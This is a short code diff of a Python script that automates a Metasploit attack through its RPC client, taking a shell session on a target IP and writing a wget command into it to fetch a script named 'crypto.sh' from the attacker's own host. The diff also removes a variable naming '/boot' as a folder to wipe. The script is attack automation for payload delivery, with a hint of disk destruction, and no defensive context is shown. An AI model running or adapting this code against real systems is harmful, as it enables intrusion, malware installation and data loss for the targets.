@@ -12,13 +12,11 @@ def record_timestamp(folder, output_time_file):
 
 def main(argv):
     if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))
+        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
-    # flag_finish = argv[4]
-    wipe_disk_folder = "/boot"
 
     client = MsfRpcClient('kali')
 
@@ -38,7 +36,7 @@ def main(argv):
     while client.jobs.list:
         time.sleep(1)
 
-    print(client.sessions.list['4'])
+    # print(client.sessions.list['4'])
 
     shell = client.sessions.session('4')
     shell.write('wget --no-check-certificate http://{0}/downloads/crypto.sh'.format(my_ip))
